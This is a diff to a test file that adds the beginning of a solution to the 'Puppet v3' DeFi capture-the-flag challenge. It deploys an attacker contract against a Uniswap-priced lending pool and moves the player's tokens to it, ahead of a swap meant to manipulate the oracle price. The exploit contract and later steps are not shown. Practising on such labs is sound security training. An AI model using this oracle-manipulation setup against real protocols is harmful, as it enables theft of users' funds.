@@ -195,6 +195,30 @@ describe("[Challenge] Puppet v3", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    //WETH-token0="0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
+    //DVT-token1="0xdF46e54aAadC1d55198A4a8b4674D7a4c927097A"
+    //Swap DVT for ETH - OneForZero
+    /**Step1: Deployment */
+    const PuppetV3Attacker = await ethers.getContractFactory("PV3Attacker");
+    const puppetV3Attacker = await PuppetV3Attacker.deploy(
+      token.address,
+      uniswapPool.address,
+      lendingPool.address,
+      weth.address
+    );
+    console.log("puppetV3Attacker is deployed at", puppetV3Attacker.address);
+    await token
+      .connect(player)
+      .transfer(puppetV3Attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+    console.log(
+      "puppetV3Attacker token balance is",
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      ),
+      "\n____________________________________________________",
+      "\nZero for One: false - Swapping token for Weth...",
+      "\n____________________________________________________"
+    );
   });
 
   after(async function () {
